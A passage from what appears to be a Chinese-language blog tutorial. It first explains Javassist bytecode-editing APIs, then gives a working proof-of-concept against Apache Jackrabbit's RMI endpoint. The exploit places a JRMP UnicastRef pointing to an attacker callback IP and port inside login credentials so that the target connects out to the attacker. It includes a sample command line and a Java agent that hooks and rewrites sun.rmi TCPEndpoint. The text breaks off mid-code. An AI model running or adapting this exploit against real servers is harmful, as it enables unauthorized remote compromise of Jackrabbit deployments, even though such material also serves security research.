值是表示该类的<code>CtClass</code>对象</li><li><code>CtClass</code>: <code>CtClass</code>表示类, 一个<code>CtClass</code>(编译时类)对象可以处理一个class文件, 这些<code>CtClass</code>对象可以从<code>ClassPool</code>获得</li><li><code>CtMethods</code>: 表示类中的方法</li><li><code>CtFields</code>: 表示类中的字段</li></ul><h3 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h3><ul><li><code>getDefault</code>: 返回默认的<code>ClassPool</code>是单例模式的，一般通过该方法创建我们的<code>ClassPool</code>；</li><li><code>appendClassPath</code>, <code>insertClassPath</code> : 将一个<code>ClassPath</code>加到类搜索路径的末尾位置 或 插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的尴尬；</li><li><code>toClass</code> : 将修改后的<code>CtClass</code>加载至当前线程的上下文类加载器中，<code>CtClass</code>的<code>toClass</code>方法是通过调用本方法实现。需要注意的是一旦调用该方法，则无法继续修改已经被加载的class；</li><li><code>get</code> , <code>getCtClass</code>: 根据类路径名获取该类的<code>CtClass</code>对象，用于后续的编辑。</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// 获取ClassPool对象, 使用系统默认类路径</span><br>ClassPool pool = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ClassPool(<span class="hljs-params">true</span>)</span>;<br><span class="hljs-comment">// 效果与 new ClassPool(true) 一致</span><br>ClassPool pool1 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassPool</span>.</span></span>get<span class="hljs-constructor">Default()</span>;<br></code></pre></td></tr></table></figure><p>为减少ClassPool可能导致的内存消耗. 可以从ClassPool中删除不必要的CtClass对象. 或者每次创建新的ClassPool对象.</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">// 从ClassPool中删除CtClass对象</span><br>ctClass.detach();<br><span class="hljs-comment">// 也可以每次创建一个新的ClassPool, 而不是ClassPool.getDefault(), 避免内存溢出</span><br>ClassPool pool2 = <span class="hljs-keyword">new</span> <span class="hljs-type">ClassPool</span>(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><h3 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h3><ul><li>freeze: 冻结一个类，使其不可修改；</li><li>isFrozen : 判断一个类是否已被冻结；</li><li>prune : 删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用；</li><li>defrost : 解冻一个类，使其可以被修改。如果事先知道一个类会被defrost， 则禁止调用 prune 方法；</li><li>detach : 将该class从ClassPool中删除；</li><li>writeFile : 根据CtClass生成 .class 文件；</li><li>toClass : 通过类加载器加载该CtClass。</li><li>setInterfaces: 添加父接口</li><li>setSuperclass: 添加父类</li></ul><p>其他详细用法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 通过类名获取 CtClass, 未找到会抛出异常</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.kawa.ssist.JustRun&quot;</span>);<br><span class="hljs-comment">// 通过类名获取 CtClass, 未找到返回 null, 不会抛出异常</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass1</span> <span class="hljs-operator">=</span> pool.getOrNull(<span class="hljs-string">&quot;com.kawa.ssist.JustRun&quot;</span>);<br><span class="hljs-comment">// 复制一个类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass2</span> <span class="hljs-operator">=</span> pool.getAndRename(<span class="hljs-string">&quot;com.kawa.ssist.JustRun&quot;</span>, <span class="hljs-string">&quot;com.kawa.ssist.JustRunq&quot;</span>);<br><span class="hljs-comment">// 创建一个新类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass3</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;com.kawa.ssist.JustRuna&quot;</span>);<br><span class="hljs-comment">// 通过class文件创建一个新类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass4</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/home/un/test/JustRun.class&quot;</span>)));<br><span class="hljs-comment">// 添加接口</span><br>ctClass.addInterface(...);<br><span class="hljs-comment">// 添加构造器</span><br>ctClass.addConstructor(...);<br><span class="hljs-comment">// 添加字段</span><br>ctClass.addField(...);<br><span class="hljs-comment">// 添加方法</span><br>ctClass.addMethod(...);<br><span class="hljs-comment">// 获取字节码文件 需要注意的是一旦调用该方法，则无法继续修改已经被加载的class</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> ctClass.toClass();<br><span class="hljs-comment">// 类的字节码文件</span><br><span class="hljs-type">ClassFile</span> <span class="hljs-variable">classFile</span> <span class="hljs-operator">=</span> ctClass.getClassFile();<br><span class="hljs-comment">// 编译成字节码文件, 使用当前线程上下文类加载器加载类, 如果类已存在或者编译失败将抛出异常</span><br><span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br></code></pre></td></tr></table></figure><h3 id="CtMethods-CtConstructor"><a href="#CtMethods-CtConstructor" class="headerlink" title="CtMethods&#x2F;CtConstructor"></a>CtMethods&#x2F;CtConstructor</h3><ul><li>insertBefore : 在方法的起始位置插入代码；</li><li>insterAfter : 在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到exception；</li><li>insertAt : 在指定的位置插入代码；</li><li>setBody: 将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除；</li><li>make : 创建一个新的方法。</li></ul><p>其他详细用法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//**获取CtMethod属性*/</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass5</span> <span class="hljs-operator">=</span> pool.get(TestService.class.getName());<br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass5.getDeclaredMethod(<span class="hljs-string">&quot;selectOrder&quot;</span>);<br><span class="hljs-comment">// 方法名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> ctMethod.getName();<br><span class="hljs-comment">// 返回类型</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">returnType</span> <span class="hljs-operator">=</span> ctMethod.getReturnType();<br><span class="hljs-comment">// 方法参数, 通过此种方式得到方法参数列表</span><br><span class="hljs-comment">// 格式: com.kawa.TestService.getOrder(java.lang.String,java.util.List)</span><br>ctMethod.getLongName();<br><span class="hljs-comment">// 方法签名 格式: (Ljava/lang/String;Ljava/util/List;Lcom/test/Order;)Ljava/lang/Integer;</span><br>ctMethod.getSignature();<br><br><span class="hljs-comment">// 获取方法参数名称, 可以通过这种方式得到方法真实参数名称</span><br>List&lt;String&gt; argKeys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><span class="hljs-type">MethodInfo</span> <span class="hljs-variable">methodInfo</span> <span class="hljs-operator">=</span> ctMethod.getMethodInfo();<br><span class="hljs-type">CodeAttribute</span> <span class="hljs-variable">codeAttribute</span> <span class="hljs-operator">=</span> methodInfo.getCodeAttribute();<br><span class="hljs-type">LocalVariableAttribute</span> <span class="hljs-variable">attr</span> <span class="hljs-operator">=</span> (LocalVariableAttribute) codeAttribute.getAttribute(LocalVariableAttribute.tag);<br><span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> ctMethod.getParameterTypes().length;<br><span class="hljs-comment">// 非静态的成员函数的第一个参数是this</span><br><span class="hljs-type">int</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> Modifier.isStatic(ctMethod.getModifiers()) ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> pos; i &lt; len; i++) &#123;<br>    argKeys.add(attr.variableName(i));<br>&#125;<br><br><br><span class="hljs-comment">//*CtMethod方法体修改*//</span><br><span class="hljs-comment">// 在方法体前插入代码块</span><br>ctMethod.insertBefore(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// 在方法体后插入代码块</span><br>ctMethod.insertAfter(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// 在某行 字节码 后插入代码块</span><br>ctMethod.insertAt(<span class="hljs-number">10</span>, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// 添加参数</span><br>ctMethod.addParameter(CtClass);<br><span class="hljs-comment">// 设置方法名</span><br>ctMethod.setName(<span class="hljs-string">&quot;newName&quot;</span>);<br><span class="hljs-comment">// 设置方法体 $0=this / $1,$2,$3... 代表方法参数</span><br>ctMethod.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<br><span class="hljs-comment">//创建一个新的方法</span><br>ctMethod.make(<span class="hljs-string">&quot;kawa&quot;</span>,CtClass);<br></code></pre></td></tr></table></figure><h3 id="CtFields"><a href="#CtFields" class="headerlink" title="CtFields"></a>CtFields</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//新建一个名为A，权限修饰符为public，类型为String，值为B的变量</span><br><span class="hljs-type">CtField</span> <span class="hljs-variable">param1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;A&quot;</span>, ctClass);<br>param1.setModifiers(Modifier.PUBLIC);<br>ctClass.addField(param1, CtField.Initializer.constant(<span class="hljs-string">&quot;B&quot;</span>));<br><br><span class="hljs-comment">//这里只用到这个就先写这个吧，还有根据变量名获取变量进行修改的太多了就不写了，网上都能找到。。只有这个不好找所以就写出来。</span><br></code></pre></td></tr></table></figure><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a><strong>思路：</strong></h3><ul><li>创建Agent（premain和transform）将<code>sun.rmi.transport.tcp.TCPEndpoint</code>HOOK</li><li>在transform处将HOOK的TCPEndpoint进行修改（我们这里的需求只用改它的四参构造方法）</li><li>将修改后的.class文件返回给transform</li><li>将Agent打jar包并配置resources\META-INF\MANIFEST.MF</li><li>把poc打包并接收targeturl、callbackip、callbackport参数</li></ul><h3 id="JRMP包："><a href="#JRMP包：" class="headerlink" title="JRMP包："></a>JRMP包：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> test;<br><br><span class="hljs-keyword">import</span> sun.rmi.server.UnicastRef;<br><span class="hljs-keyword">import</span> org.apache.commons.cli.*;<br><span class="hljs-keyword">import</span> org.apache.jackrabbit.rmi.repository.URLRemoteRepository;<br><span class="hljs-keyword">import</span> javax.jcr.Repository;<br><span class="hljs-keyword">import</span> javax.jcr.RepositoryException;<br><span class="hljs-keyword">import</span> javax.jcr.SimpleCredentials;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, RepositoryException &#123;<br>        <span class="hljs-type">Options</span> <span class="hljs-variable">options</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Options</span>();<br><br><br><br>        <span class="hljs-type">Option</span> <span class="hljs-variable">targetUrlOption</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Option</span>(<span class="hljs-string">&quot;tu&quot;</span>, <span class="hljs-string">&quot;targeturl&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;Target URL&quot;</span>);<br>        targetUrlOption.setRequired(<span class="hljs-literal">true</span>);<br>        options.addOption(targetUrlOption);<br><br>        <span class="hljs-type">Option</span> <span class="hljs-variable">callbackIpOption</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Option</span>(<span class="hljs-string">&quot;ci&quot;</span>, <span class="hljs-string">&quot;callbackip&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;Callback IP address&quot;</span>);<br>        callbackIpOption.setRequired(<span class="hljs-literal">true</span>);<br>        options.addOption(callbackIpOption);<br><br>        <span class="hljs-type">Option</span> <span class="hljs-variable">callbackPortOption</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Option</span>(<span class="hljs-string">&quot;cp&quot;</span>, <span class="hljs-string">&quot;callbackport&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;Callback port&quot;</span>);<br>        callbackPortOption.setType(Integer.class);<br>        callbackPortOption.setRequired(<span class="hljs-literal">true</span>);<br>        options.addOption(callbackPortOption);<br><br>        <span class="hljs-type">CommandLineParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultParser</span>();<br>        <span class="hljs-type">HelpFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelpFormatter</span>();<br><br>        CommandLine cmd;<br>        <span class="hljs-keyword">try</span> &#123;<br>            cmd = parser.parse(options, args);<br>        &#125; <span class="hljs-keyword">catch</span> (ParseException e) &#123;<br>            System.out.println(e.getMessage());<br>            formatter.printHelp(<span class="hljs-string">&quot;Apache_jackrabbit_TRUE.jar&quot;</span>, options);<br>            System.exit(<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">targetUrl</span> <span class="hljs-operator">=</span> cmd.getOptionValue(<span class="hljs-string">&quot;targeturl&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">callbackip</span> <span class="hljs-operator">=</span> cmd.getOptionValue(<span class="hljs-string">&quot;callbackip&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">callbackport</span> <span class="hljs-operator">=</span> Integer.parseInt(cmd.getOptionValue(<span class="hljs-string">&quot;callbackport&quot;</span>));<br><br><br>        String host= callbackip;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> callbackport;<br>        java.rmi.server.<span class="hljs-type">ObjID</span> <span class="hljs-variable">objId</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.rmi.server.ObjID();<br>        sun.rmi.transport.tcp.<span class="hljs-type">TCPEndpoint</span> <span class="hljs-variable">endpoint</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.rmi.transport.tcp.TCPEndpoint(host, port);<br>        sun.rmi.transport.<span class="hljs-type">LiveRef</span> <span class="hljs-variable">liveRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.rmi.transport.LiveRef(objId, endpoint, <span class="hljs-literal">false</span>);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">unicastRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.rmi.server.UnicastRef(liveRef);<br><br>        <span class="hljs-type">SimpleCredentials</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleCredentials</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>.toCharArray());<br>        exp.setAttribute( <span class="hljs-string">&quot;admin111&quot;</span>,unicastRef);<br>        <span class="hljs-type">Repository</span> <span class="hljs-variable">repository</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLRemoteRepository</span>(targetUrl);<span class="hljs-comment">//目标地址  //10.65.14.146本地    10.65.14.247远程      eg:     http://10.65.14.247:8080/rmi</span><br><br>        repository.login(exp);<br><br><span class="hljs-comment">//    java -jar test.jar  --targeturl=&quot;http://10.65.14.247:8080/rmi&quot; --callbackip=&quot;10.65.14.146&quot; --callbackport=7878</span><br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>MANIFEST.MF：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Manifest-Version: <span class="hljs-number">1.0</span><br>Main-Class: test.JRMP<br><br><br></code></pre></td></tr></table></figure><h3 id="Agent包"><a href="#Agent包" class="headerlink" title="Agent包"></a>Agent包</h3><p><strong>Mainagent.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Mainagent</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        <span class="hljs-comment">//Agnet接收参数</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">callbackip</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">targetip</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (agentArgs != <span class="hljs-literal">null</span> &amp;&amp; !agentArgs.isEmpty()) &#123;<br>            String[] args = agentArgs.split(<span class="hljs-string">&quot;,&quot;</span>);<br>            <span class="hljs-keyword">for</span> (String arg : args) &#123;<br>                String[] keyValue = arg.split(<span class="hljs-string">&quot;=&quot;</span>);<br>                <span class="hljs-keyword">if</span> (keyValue.length == <span class="hljs-number">2</span> &amp;&amp; keyValue[<span class="hljs-number">0</span>].trim().equals(<span class="hljs-string">&quot;callbackip&quot;</span>)) &#123;<br>                    callbackip = keyValue[<span class="hljs-number">1</span>].trim();<br>                &#125;<br>                <span class="hljs-keyword">if</span> (keyValue.length == <span class="hljs-number">2</span> &amp;&amp; keyValue[<span class="hljs-number">0</span>].trim().equals(<span class="hljs-string">&quot;targetip&quot;</span>)) &#123;<br>                    targetip = keyValue[<span class="hljs-number">1</span>].trim();<br>                &#125;<br>            &#125;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;agnet proxy has start&quot;</span>);<br>        inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TAT</span>(targetip, callbackip), <span class="hljs-literal">true</span>);<span class="hljs-comment">//传入实现ClassFileTransformer的对象，后面必须传true，否则不允许修改</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>TAT.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Agent;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TAT</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">Hook_class</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;sun/rmi/transport/tcp/TCPEndpoint&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">Hook_class1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;sun.rmi.transport.tcp.TCPEndpoint&quot;</span>;<br>    <span class="hljs-keyword">public</span> String targetip;<br>    <span class="hljs-keyword">public</span> String callbackip;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TAT</span><span class="hljs-params">(String targetip,String callbackip)</span>&#123;<br>        <span class="hljs-built_in">this</span>.targetip = targetip;<br>        <span class="hljs-built_in">this</span>.callbackip = callbackip;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader,<br>                            String className,<br>                            Class&lt;?&gt; classBeingRedefined,<br>                            ProtectionDomain protectionDomain,<br>                            <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br><br>        <span class="hljs-keyword">if</span> (Hook_class.equals(className))&#123;<br>            <span class="hljs-comment">//接收targetIP和callbackIP，用于比较</span><br><span class="hljs-comment">//            Scanner scanner = new Scanner(System.in);</span><br><span class="hljs-comment">//            System.out.print(&quot;Place input Callback_ip[String]&quot;);</span><br><span class="hljs-comment">//            String callback_ip = scanner.nextLine();</span><br><span class="hljs-comment">//            System.out.print(&quot;Place input Target_ip[String]&quot;);</span><br><span class="hljs-comment">//            String target_ip = scanner.nextLine();</span><br>            <br><span class="hljs-comment">///////哈哈哈，当时想阻塞传值，后来发现可以这样传就没用上面那种了</span><br>            <br>            <br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            CtClass ctClass;<br>            <span class="hljs-keyword">try</span> &#123;<br>                ctClass = pool.get(Hook_class1);<br>                <span class="hljs-comment">//添加targetip = 输入的目标地址</span><br>                <span class="hljs-type">CtField</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;targetip&quot;</span>, ctClass);<br>                param.setModifiers(Modifier.PUBLIC);<br>                ctClass.addField(param, CtField.Initializer.constant(targetip));<br><br>                <span class="hljs-comment">//添加callbackip = 输入的回连地址</span><br>                <span class="hljs-type">CtField</span> <span class="hljs-variable">param1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;callbackip&quot;</span>, ctClass);<br>                param1.setModifiers(Modifier.PUBLIC);<br>                ctClass.addField(param1, CtField.Initializer.constant(callbackip));<br><br>                System.out.println(<span class="hljs-string">&quot;TAT_____targetip：&quot;</span>+targetip);<br>                System.out.println(<span class="hljs-string">&quot;TAT_____callbackip：&quot;</span>+callbackip);<br><br>                <span class="hljs-comment">//创建新构造方法并赋值</span><br>                <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.getDeclaredConstructor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), CtClass.intType,pool.get(<span 